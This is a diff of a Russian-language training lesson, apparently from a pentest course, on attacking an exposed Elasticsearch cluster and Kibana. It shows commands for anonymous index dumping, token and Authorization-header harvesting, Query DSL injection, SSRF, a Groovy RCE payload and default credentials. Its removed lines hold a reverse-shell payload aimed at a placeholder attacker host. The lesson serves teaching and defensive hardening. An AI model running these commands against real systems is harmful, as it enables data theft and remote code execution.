@@ -15,300 +15,182 @@ estimated_minutes: 45
 summary: "Elasticsearch: фингерпринт 9200, анонимный доступ, дамп индексов через _cat/_search, Query DSL, painless-инъекция и RCE через скрипты и Kibana CVE."
 ---
 
-Elasticsearch — распределённый поисковый движок на базе Lucene, который говорит по **HTTP/JSON** на порт 9200. Это делает его одновременно и удобным (обычный `curl`), и опасным: до версии 7.x он не имел встроенной аутентификации, а старые сборки позволяли исполнять скрипты на сервере — вплоть до RCE. Отдельный слой риска — **Kibana** (веб-морда над Elasticsearch) с её историей CVE. Если порт 9200 открыт, вы читаете весь кластер через `_cat` и `_search`; если он спрятан за приложением, инъекция уходит в **Query DSL** или **painless-скрипт**.
+## Задача
 
-## Порт, фингерпринт и версия
+Третий открытый порт у `shop.local` — 9200. Elasticsearch это поисковый движок, который говорит по обычному HTTP/JSON, поэтому с ним удобно работать `curl`. До версии 7.x у него не было встроенной аутентификации, а очень старые сборки исполняли скрипты на сервере вплоть до RCE. Разберём: как прочитать весь кластер и где искать выполнение кода.
 
-Elasticsearch слушает **9200** (REST) и **9300** (transport, бинарный). Первый запрос отдаёт всё:
+## Данные, с которыми работаем
 
-```bash
-curl -s http://target:9200/
-# {
-#   "name" : "node-1",
-#   "cluster_name" : "docker-cluster",
-#   "version" : { "number" : "7.10.2", ... },
-#   "tagline" : "You Know, for Search"
-# }
-
-curl -s http://target:9200/ | jq '.version.number'   # -> "7.10.2"
-nmap -sV -p 9200,9300 target
-```
-
-Признаки в HTML-интерфейсах и заголовках: заголовок страницы `You Know, for Search`, `X-elastic-product: Elasticsearch`, JSON с `cluster_name`/`version.number`. Кибана на 5601 отдаёт `kbn-name` и `kbn-version`.
+Первый запрос отдаёт всё о сервере:
 
 ```bash
-curl -sI http://target:9200/ | grep -i elastic
-curl -s http://target:5601/api/status | jq '.version.number'   # Kibana
+$ curl -s http://shop.local:9200/
+{
+  "name" : "node-1",
+  "cluster_name" : "shop-cluster",
+  "version" : { "number" : "7.10.2", ... },
+  "tagline" : "You Know, for Search"
+}
 ```
 
-## Открытый кластер: _cat, _cluster, _nodes
-
-При отсутствии security-модуля (`xpack.security.enabled: false`) все API доступны анонимно. Начинаем с «кошачьих» API — они отдают плоский текст.
+`cluster_name` и `tagline` «You Know, for Search» — безошибочные признаки Elasticsearch. Версию вытаскиваем точно:
 
 ```bash
-curl -s 'http://target:9200/_cat/indices?v'      # индексы + размеры + число док-в
-curl -s 'http://target:9200/_cat/nodes?v'        # узлы, версии, роли
-curl -s 'http://target:9200/_cat/health?v'       # состояние кластера
-curl -s 'http://target:9200/_cat/aliases?v'
-curl -s 'http://target:9200/_cluster/settings?pretty'
-curl -s 'http://target:9200/_nodes?pretty'       # ОС, JVM, пути, окружение
+$ curl -s http://shop.local:9200/ | jq '.version.number'
+"7.10.2"
 ```
 
-Полезно для картирования: `_nodes` показывает версию Java, путь установки и иногда переменные окружения; `_cat/indices` показывает, где лежат данные (например, `users`, `orders`, `logs-*`).
+## Шаг 1: карта кластера через «кошачьи» API
 
-## Дамп индексов и документов
-
-Дальше выгружаем содержимое.
+При выключенном security-модуле все API доступны анонимно. «Кошачьи» API (`_cat`) отдают плоский текст — это быстрейшая карта данных:
 
 ```bash
-# документы индекса
-curl -s 'http://target:9200/users/_search?pretty&size=100'
-curl -s 'http://target:9200/users/_search?q=*&size=1000' > users.json
-
-# все индексы, которые начинаются на logs
-curl -s 'http://target:9200/logs-*/_search?size=10&pretty'
-
-# mapping (схема полей)
-curl -s 'http://target:9200/users/_mapping?pretty'
-
-# по одному документу
-curl -s 'http://target:9200/users/_doc/1?pretty'
-
-# счётчик документов
-curl -s 'http://target:9200/users/_count?pretty'
+$ curl -s 'http://shop.local:9200/_cat/indices?v'
+health status index              docs.count store.size
+green  open   users                    1240      1.2mb
+green  open   orders                   8103      4.5mb
+green  open   sessions                 2310      0.9mb
+green  open   logs-app-2026.10.11      9921     12.3mb
 ```
 
-Массовый дамп через `_search` с прокруткой (scroll) для больших индексов:
+Индексы — как таблицы. Видно, где лежит интересное: `users`, `sessions`, `logs-*`. Дополнительно `_nodes` показывает ОС, версию Java и пути:
 
 ```bash
-curl -s 'http://target:9200/users/_search?scroll=1m&size=1000' > page0.json
-sid=$(jq -r '._scroll_id' page0.json)
-curl -s "http://target:9200/_search/scroll" -H 'Content-Type: application/json' \
-  -d "{\"scroll\":\"1m\",\"scroll_id\":\"$sid\"}" > page1.json
+$ curl -s 'http://shop.local:9200/_nodes?pretty' | jq '.nodes[].os.name'
+"Linux"
 ```
 
-Из выгрузки ищем секреты:
+## Шаг 2: дамп документов
+
+Документы — это строки индекса. Выгружаем:
 
 ```bash
-jq -r '.. | strings' users.json | grep -iE 'password|token|secret|jwt|api[_-]?key' | sort -u
+$ curl -s 'http://shop.local:9200/users/_search?size=100' | jq '.hits.hits[]._source'
+{
+  "username": "admin",
+  "password": "$2b$10$QmFzZTY0...",
+  "role": "admin"
+}
+{
+  "username": "root",
+  "password": "$2b$10$dG9wU2VjcmV0..."
+}
 ```
 
-## Query DSL и инъекция в поисковые параметры
-
-Если приложение строит запрос к Elasticsearch из пользовательского ввода, вы влияете на **Query DSL** — JSON-структуру запроса. Признаки: эндпоинт поиска, параметры `q`, `query`, `filter`, `from`/`size`.
+Хеши паролей. Теперь сессии — там обычно токены:
 
 ```bash
-# прямая инъекция через _search
-curl -s 'http://target:9200/users/_search' -H 'Content-Type: application/json' -d '{
-  "query": { "match_all": {} }
-}'
-
-# обход фильтра по владельцу (если приложение подставляет "owner":"victim")
-curl -s 'http://target:9200/orders/_search' -H 'Content-Type: application/json' -d '{
-  "query": { "bool": { "must": [ {"match_all": {}} ] } }
-}'
+$ curl -s 'http://shop.local:9200/sessions/_search?size=100' | jq -r '.hits.hits[]._source.token'
+eyJhbGciOiJIUzI1NiJ9.eyJ1aWQiOjF9...
 ```
 
-Приём — заменить жёсткое условие на `match_all` или добавить `"minimum_should_match": 0`, чтобы вернулись все документы. Если параметр уходит в `q=` (Lucene query string), инъекция выглядит так:
-
-```
-q=*:*                 -> всё
-q=field:*             -> поле существует
-q=owner:victim OR *:* -> расширение выборки
-```
-
-## Painless script injection
-
-Скрипты в Elasticsearch (язык **painless**) вычисляют поля на лету. Если пользовательский ввод попадает в `script`, вы исполняете код в JVM.
+И самое ценное — логи приложения, где встречаются заголовки `Authorization` и куки:
 
 ```bash
-curl -s 'http://target:9200/users/_search' -H 'Content-Type: application/json' -d '{
-  "query": { "bool": { "filter": {
-    "script": { "script": "doc[\u0027password\u0027].value != null" }
-  } } }
-}'
-
-# сортировка через скрипт (исполняется на каждом документе)
-curl -s 'http://target:9200/users/_search' -H 'Content-Type: application/json' -d '{
-  "query": { "match_all": {} },
-  "sort": { "_script": { "type": "number",
-    "script": { "source": "doc[\u0027id\u0027].value" }, "order": "desc" } }
-}'
+$ curl -s 'http://shop.local:9200/logs-*/_search?size=200' | jq -r '..|strings' \
+>   | grep -iE 'authorization|bearer|password' | head -3
+authorization: Bearer eyJhbGciOiJIUzI1NiJ9...
 ```
 
-Скрипт-контекст ограничен песочницей (нет `java.lang.Runtime` напрямую), но при `script.painless.regex.enabled` и небезопасных настройках возможны выходы. На старых версиях с **Groovy** динамические скрипты давали прямой RCE — см. ниже.
+`jq -r '..|strings'` рекурсивно достаёт все строки из JSON — удобно, когда структура заранее неизвестна.
 
-## RCE через скрипты и Kibana
+## Шаг 3: Query DSL и инъекция в поиск
 
-**Groovy (CVE-2015-1427).** Elasticsearch до 1.3.8/1.4.3 исполнял Groovy-скрипты без песочницы:
+Если приложение само строит запрос к Elasticsearch из нашего ввода, мы влияем на **Query DSL** — JSON-описание запроса. Признаки: эндпоинт поиска, параметры `q`, `query`, `filter`. Например, приложение ограничивает выдачу владельцем:
+
+```json
+{"query": {"term": {"owner": "victim"}}}
+```
+
+Подменим условие на «все документы»:
 
 ```bash
-curl -s 'http://target:9200/_search' -H 'Content-Type: application/json' -d '{
-  "size": 1,
-  "script_fields": {
-    "exp": { "lang": "groovy",
-      "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()" }
-  }
-}'
+$ curl -s 'http://shop.local:9200/orders/_search' -H 'Content-Type: application/json' \
+>   -d '{"query": {"bool": {"must": [{"match_all": {}}]}}}' | jq '.hits.total.value'
+8103
 ```
 
-**Kibana Timelion (CVE-2019-7609).** В Kibana < 6.6.1 через Timelion можно было исполнить JS на сервере (Node.js) — цепочка с `es(*).props(...)` и `require`:
+`match_all` — «совпадает всё». Если ввод уходит в Lucene-строку (`q=`), инъекция ещё проще: `q=*:*` вернёт всё, `q=owner:victim OR *:*` расширит выборку.
 
-```
-.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("bash -i >& /dev/tcp/ATTACKER/4444 0>&1")')
-.props(label.__proto__.env.NODE_OPTIONS='--require /proc/self/environ')
-```
+## Шаг 4: painless-скрипты
 
-После визита на сохранённую Timelion-вкладку Node-процесс Кибаны выполняет команду.
-
-**Kibana Console/Dev Tools (CVE-2019-7609 и родственные), Kibana 5601.** Проверяйте версию:
+**Painless** — встроенный язык скриптов Elasticsearch. Если наш ввод попадает в `script`, код исполняется в JVM:
 
 ```bash
-curl -s http://target:5601/api/status | jq '.version.number'
+$ curl -s 'http://shop.local:9200/users/_search' -H 'Content-Type: application/json' -d '{
+>   "query": {"match_all": {}},
+>   "sort": {"_script": {"type": "number",
+>     "script": {"source": "doc[\u0027id\u0027].value"}, "order": "desc"}}
+> }'
 ```
 
-Если версия старая — ищите соответствующий CVE-эксплойт (searchsploit `kibana`).
+`\u0027` — это одинарная кавычка, закодированная так, чтобы не ломать JSON. Painless работает в песочнице, прямого `Runtime` там нет, но при небезопасных настройках бывают обходы.
 
-## Elasticsearch в стеке: Logstash, Beats, SSRF
-
-Elasticsearch редко один — рядом Logstash (5044/9600) и Beats. Полезные точки:
-
-- **Logstash** может принимать события извне и **выполнять фильтры**; инъекция в конфиг Logstash иногда ведёт к RCE.
-- **SSRF в приложении** к `http://127.0.0.1:9200` открывает весь кластер без внешнего доступа — отправляйте `GET /_cat/indices?v` через SSRF-эндпоинт.
-- **Elasticsearch как хранилище логов** часто содержит токены, куки и заголовки авторизации — дамп `logs-*` бывает ценнее самой базы.
+Скрипт можно не только передать в запросе, но и **сохранить** на сервере, а потом вызывать по id:
 
 ```bash
-# через SSRF-параметр
-curl -s 'https://target/api/fetch?url=http://127.0.0.1:9200/_cat/indices?v'
+$ curl -s -X PUT 'http://shop.local:9200/_scripts/x' -H 'Content-Type: application/json' \
+>   -d '{"script": {"lang": "painless", "source": "doc[\u0027role\u0027].value"}}'
+{"acknowledged":true}
 ```
 
-## Разобранный пример
+Ещё один канал — **ingest-пайплайны**: они применяют painless к каждому входящему документу. Если у нас есть право создавать пайплайны, код исполняется на всех новых данных.
 
-Цель: `target:9200` открыт.
+## Шаг 5: RCE на старых версиях — Groovy и Kibana
+
+**Groovy (CVE-2015-1427).** Elasticsearch до 1.3.8/1.4.3 исполнял Groovy без песочницы:
 
 ```bash
-# Шаг 1. Версия
-curl -s http://target:9200/ | jq '.version.number,.cluster_name'
-# "7.10.2" / "prod-cluster"
-
-# Шаг 2. Индексы
-curl -s 'http://target:9200/_cat/indices?v'
-# users  orders  sessions  logs-app-2026.10.11
-
-# Шаг 3. Дамп users
-curl -s 'http://target:9200/users/_search?size=100&pretty' | jq '.hits.hits[]._source'
-
-# Шаг 4. Сессии -> токены
-curl -s 'http://target:9200/sessions/_search?size=100' | jq -r '.hits.hits[]._source.token'
-
-# Шаг 5. Логи -> Authorization-заголовки
-curl -s 'http://target:9200/logs-*/_search?size=200' | jq -r '..|strings' \
-  | grep -iE 'authorization|bearer|password' | head
-
-# Шаг 6. Если версия < 1.4.3 -> Groovy RCE (см. выше)
+$ curl -s 'http://shop.local:9200/_search' -H 'Content-Type: application/json' -d '{
+>   "size": 1,
+>   "script_fields": {"exp": {"lang": "groovy",
+>     "script": "java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}
+> }'
 ```
 
-## Частые ошибки
+`forName(...Runtime).getRuntime().exec("id")` — стандартный вызов процесса; `.getText()` возвращает вывод. На 7.10.2 это, конечно, не сработает — но версию надо проверить всегда.
 
-- **Ожидать SQL.** Elasticsearch не понимает `' OR 1=1`; инъекция — это изменение JSON Query DSL или painless-скрипта.
-- **Игнорировать версию.** Groovy-RCE есть только на очень старых версиях; painless с 5.x песочница, прямой RCE там нет.
-- **Забыть про `_cat`.** Быстрейшая карта кластера — `_cat/indices`, а не перебор имён индексов.
-- **Слишком большой `size`.** `size` ограничен `index.max_result_window` (по умолчанию 10000); для большего нужен scroll/`search_after`.
-- **Путать 9200 и 9300.** 9300 — бинарный transport, `curl` там бесполезен; работайте по 9200.
-- **Забыть про Kibana.** Открытый 9200 часто сопровождается 5601 с отдельными CVE.
-- **Разрушительные запросы.** `DELETE /index`, `_delete_by_query` удаляют данные — не выполняйте без согласования.
+**Kibana.** Рядом часто стоит веб-морда Kibana на порту 5601:
 
-## Полный справочник: команды, пейлоады, примитивы
+```bash
+$ curl -s http://shop.local:5601/api/status | jq '.version.number'
+"6.5.0"
+```
 
-Сводные таблицы: фингерпринт, клиентские команды, дамп/Query DSL, скрипты и RCE, безопасность/привилегии.
+Версия 6.5.0 уязвима к **CVE-2019-7609** (Timelion): специальная вкладка заставляла Node.js-процесс Kibana выполнить команду. Проверяй версию Kibana отдельно от Elasticsearch — у них разные CVE.
 
-### (а) Фингерпринт и версия
+## Шаг 6: Elasticsearch как источник секретов через SSRF
 
-| Команда/пейлоад | Что делает | Пример |
-|-----------------|-----------|--------|
-| `GET /` | версия, кластер, tagline | `curl -s http://target:9200/` → `"number":"7.10.2"` |
-| `jq '.version.number'` | вытащить версию | `curl -s http://target:9200/ \| jq '.version.number'` |
-| `X-elastic-product` header | заголовок-признак | `curl -sI http://target:9200/ \| grep -i elastic` |
-| `_cat/nodes?v` | узлы, версии, роли | `curl -s 'http://target:9200/_cat/nodes?v'` |
-| `_nodes?pretty` | ОС, JVM, пути, окружение | `curl -s 'http://target:9200/_nodes?pretty'` |
-| `_cluster/health?pretty` | состояние кластера | |
-| `_cluster/settings?pretty` | настройки кластера | |
-| Kibana `/api/status` | версия Kibana | `curl -s http://target:5601/api/status \| jq '.version.number'` |
-| `kbn-name` / `kbn-version` | заголовки Kibana | `curl -sI http://target:5601/` |
-| `nmap -sV -p 9200,9300` | баннер | |
+Даже если 9200 закрыт снаружи, приложение может ходить в него. Тогда `GET /_cat/indices?v` уходит через SSRF-параметр:
 
-### (б) Клиентские команды (curl + _cat API)
+```bash
+$ curl -s 'https://shop.local/api/fetch?url=http://127.0.0.1:9200/_cat/indices?v'
+green open users 1240 1.2mb
+green open sessions 2310 0.9mb
+```
 
-| Команда/эндпоинт | Что делает | Пример |
-|------------------|-----------|--------|
-| `-u user:pass` | basic-auth | `curl -u elastic:changeme http://target:9200/` |
-| `-k` / `--insecure` | игнорировать TLS-сертификат | `curl -k https://target:9200/` |
-| `-H 'Content-Type: application/json'` | JSON-тело | `curl -H 'Content-Type: application/json' -d '{...}'` |
-| `_cat/indices?v` | индексы + размеры + док-ты | `curl -s 'http://target:9200/_cat/indices?v'` |
-| `_cat/nodes?v` | узлы | |
-| `_cat/health?v` | здоровье | |
-| `_cat/aliases?v` | алиасы | |
-| `_cat/shards?v` | шарды и размещение | |
-| `_cat/count?v` | число документов | |
-| `_cat/plugins?v` | плагины | |
-| `_cat/thread_pool?v` | пулы потоков | |
-| `_cat/segments?v` | сегменты Lucene | |
-| `_cluster/state` | состояние кластера | |
-| `_tasks?pretty` | задачи | |
-| `elasticdump --input=... --output=...` | выгрузка индекса | `elasticdump --input=http://target:9200/users --output=users.json` |
-| Kibana Dev Tools (`:5601/app/kibana#/dev_tools`) | консоль запросов | |
+Логи в Elasticsearch часто содержат токены и куки — их дамп бывает ценнее самой базы. Разбор SSRF — в ветке `web-ssrf`.
 
-### (в) Дамп и Query DSL
+## Что мы теперь знаем
 
-| Запрос | Что делает | Пример |
-|--------|-----------|--------|
-| `_search?q=*` | все документы | `curl -s 'http://target:9200/users/_search?q=*&size=100'` |
-| `{"query":{"match_all":{}}}` | все документы (DSL) | `-d '{"query":{"match_all":{}}}'` |
-| `size` / `from` | пагинация | `_search?size=100&from=0` |
-| `scroll=1m` + `_search/scroll` | прокрутка больших индексов | `_search?scroll=1m&size=1000` |
-| `_msearch` | пакетные запросы | `POST /_msearch` c NDJSON |
-| `_count` | число документов | `users/_count?pretty` |
-| `_mapping` | схема полей | `users/_mapping?pretty` |
-| `_doc/<id>` | один документ | `users/_doc/1?pretty` |
-| `field:*` (Lucene q) | поле существует | `_search?q=email:*` |
-| `owner:victim OR *:*` | расширение выборки | `_search?q=owner:victim OR *:*` |
-| `{"bool":{"must":[{"match_all":{}}]}}` | обход фильтра владельца | `-d '{"query":{"bool":{"must":[{"match_all":{}}]}}}'` |
-| `{"minimum_should_match":0}` | вернуть всё | |
-| `_all` / `_cat/indices` | карта данных | |
-| `jq -r '..\|strings'` | искать секреты в выгрузке | `jq -r '.. \| strings' users.json \| grep -iE 'pass\|token'` |
+- Elasticsearch говорит по HTTP/JSON на 9200; `tagline` и `cluster_name` — его признаки.
+- При выключенном security кластер читается анонимно через `_cat/indices` и `_search`.
+- Дамп документов — это `_search`; `jq -r '..|strings'` ищет секреты в выгрузке.
+- Инъекция — это изменение Query DSL (`match_all`) или painless-скрипта.
+- Groovy-RCE — только на очень старых версиях; Kibana (5601) имеет отдельные CVE.
+- Логи (`logs-*`) часто содержат `Authorization`-заголовки и токены.
 
-### (г) Скрипты, запись и RCE
+## На что смотреть дальше
 
-| Примитив | Что делает | Пример |
-|----------|-----------|--------|
-| `script_fields` (Groovy) | RCE на ES < 1.3.8/1.4.3 (CVE-2015-1427) | `{"script_fields":{"e":{"lang":"groovy","script":"java.lang.Math.class.forName(\"java.lang.Runtime\").getRuntime().exec(\"id\").getText()"}}}` |
-| painless-скрипт | вычисление полей/сортировка | `{"script":{"source":"doc['id'].value"}}` |
-| Kibana Timelion | RCE на Kibana < 6.6.1 (CVE-2019-7609) | `.es(*).props(label.__proto__.env.AAAA='require("child_process").exec("id")')` |
-| Kibana Console | отправка произвольных запросов | через Dev Tools |
-| `_scripts/<id>` | сохранённый скрипт | `PUT _scripts/x {"script":{"lang":"painless","source":"..."}}` |
-| `_ingest/pipeline` | painless в пайплайне ingest | `PUT _ingest/pipeline/p {"processors":[{"script":{...}}]}` |
-| `_snapshot/<repo>` | снапшоты (чтение/запись) | `PUT _snapshot/repo {"type":"fs","settings":{"location":"/tmp"}}` |
-| `_cluster/settings` | задать `path.repo` и др. | `PUT _cluster/settings {"persistent":{"path.repo":["/tmp"]}}` |
-| `_reindex` | переиндексация (в т.ч. из удалённого кластера) | `POST _reindex {"source":{"remote":{...}},"dest":{"index":"x"}}` |
-| `_update_by_query` / `_delete_by_query` | **изменяют данные** — только с согласования | |
-
-### (д) Безопасность и привилегии
-
-| Запрос | Что делает | Пример |
-|--------|-----------|--------|
-| `_xpack/security/_authenticate` | кто я | `curl -u elastic:p http://target:9200/_xpack/security/_authenticate` |
-| `_security/user` | список пользователей | `curl -u elastic:p http://target:9200/_security/user` |
-| `_security/role` | роли | |
-| `_security/api_key` | API-ключи | `GET /_security/api_key` |
-| `_security/user/<u>/_password` | сменить пароль | `POST /_security/user/elastic/_password {"password":"x"}` |
-| `_nodes/settings?pretty` | настройки узлов | |
-| `_cluster/settings?include_defaults=true` | все настройки | |
-| Дефолтные пары | вход по умолчанию | `elastic:changeme`, `kibana:kibana`, `logstash:changeme`, `admin:admin` |
-| `_license` | тип лицензии (есть ли security) | `GET /_license` |
+- **Не жди SQL.** `' OR 1=1` тут не работает; инъекция — в JSON-структуре запроса или скрипте.
+- **`size` ограничен.** По умолчанию максимум 10000 (`index.max_result_window`); больше — только через scroll/`search_after`.
+- **9200 ≠ 9300.** 9300 — бинарный transport, `curl` там бесполезен.
+- **Дефолтные пары.** `elastic:changeme`, `kibana:kibana`, `logstash:changeme` меняют не всегда.
+- **Разрушительное — с согласия.** `DELETE /index`, `_delete_by_query` стирают данные; не выполняй без разрешения.
 
 ## Квиз
 
-Выберите один вариант в каждом вопросе.
+Проверь себя.
 
 ```quiz
 - question: "Какой порт по умолчанию у REST-API Elasticsearch?"
@@ -318,44 +200,48 @@ curl -s 'http://target:9200/logs-*/_search?size=200' | jq -r '..|strings' \
     - "27017"
     - "5984"
   answer: 1
-  explanation: "9200 — REST; 9300 — transport. 6379/27017/5984 — Redis/Mongo/CouchDB."
-- question: "Какое API перечисляет индексы кластера плоским текстом?"
+  explanation: "9200 — REST; 9300 — бинарный transport, curl туда бесполезен."
+- question: "Какой набор API быстрее всего даёт карту индексов?"
   options:
-    - "_cat/indices?v"
-    - "_search/all"
-    - "_list/db"
-    - "SHOW TABLES"
+    - "`_cat/indices?v`"
+    - "`SELECT * FROM indices`"
+    - "`KEYS *`"
+    - "`SHOW TABLES`"
   answer: 0
-  explanation: "_cat/indices?v отдаёт список индексов с размерами и числом документов."
-- question: "На каком языке пишутся скрипты в современном Elasticsearch?"
+  explanation: "«Кошачьи» API отдают плоский текст: индексы, размеры, число документов."
+- question: "Чем является инъекция в Elasticsearch?"
   options:
-    - "SQL"
-    - "painless"
-    - "Groovy"
-    - "Lua"
+    - "Кавычкой `' OR 1=1`"
+    - "Изменением JSON Query DSL или painless-скрипта"
+    - "Командой `UNION SELECT`"
+    - "Подстановкой `$ne`"
   answer: 1
-  explanation: "painless — дефолтный язык; Groovy использовался в старых версиях и давал RCE."
-- question: "Какой CVE позволяет выполнить код через Kibana Timelion?"
+  explanation: "Запрос — это JSON-структура; подмена условия на `match_all` расширяет выборку."
+- question: "На каких версиях Elasticsearch возможен Groovy-RCE (CVE-2015-1427)?"
   options:
-    - "CVE-2021-44228"
-    - "CVE-2019-7609"
-    - "CVE-2015-1427"
-    - "CVE-2017-12635"
+    - "На 7.x"
+    - "На очень старых (< 1.3.8/1.4.3)"
+    - "На всех"
+    - "Ни на каких"
   answer: 1
-  explanation: "CVE-2019-7609 — Kibana Timelion RCE; CVE-2015-1427 — Groovy в Elasticsearch."
-- question: "Что чаще всего ценно в логах Elasticsearch?"
+  explanation: "Groovy исполнялся без песочницы только в старых сборках."
+- question: "Почему логи `logs-*` ценны при тестировании?"
   options:
-    - "Размер индексов"
-    - "Токены, куки и заголовки Authorization"
-    - "Названия узлов"
-    - "Версия Java"
+    - "Они занимают меньше места"
+    - "В них часто попадают токены, куки и заголовки Authorization"
+    - "Они зашифрованы"
+    - "Их нельзя выгрузить"
   answer: 1
-  explanation: "Логи содержат авторизационные заголовки и секреты, попавшие в запросы."
+  explanation: "Логи приложения нередко содержат аутентификационные данные в открытом виде."
 ```
+
+## Куда дальше
+
+Мы разобрали три «больших» хранилища. В следующем уроке `db-other` — остальные: CouchDB с «admin party», Cassandra и Neo4j с дефолтными паролями, Memcached без аутентификации вообще. А пока главное запомни: открытый Elasticsearch — это весь кластер как на ладони, и логи в нём часто ценнее самой базы.
 
 ## Где пригодится
 
-- **CTF (Web):** открытый Elasticsearch — быстрый флаг через `_cat` и `_search`; старые версии дают RCE.
-- **Bug bounty:** незащищённый 9200 в интернете — частый critical (утечка данных); Kibana CVE — отдельная программа.
-- **Пентест:** ES в стеке с логами/сессиями — источник токенов и путь к латеральному движению.
-- **Работа (AppSec):** hardening (включить `xpack.security`, bind на localhost, обновлять Kibana) — прямой вывод из этих атак.
+- **CTF (Web):** открытый 9200 и дамп индексов — быстрый путь к флагу в `logs-*`.
+- **Bug bounty:** анонимный кластер с PII и токенами — critical.
+- **Пентест:** Elasticsearch/Logstash часто стоят рядом с приложением и хранят чувствительные логи.
+- **Работа (AppSec):** включить `xpack.security`, bind на localhost, убрать дефолтные пароли — базовый hardening.
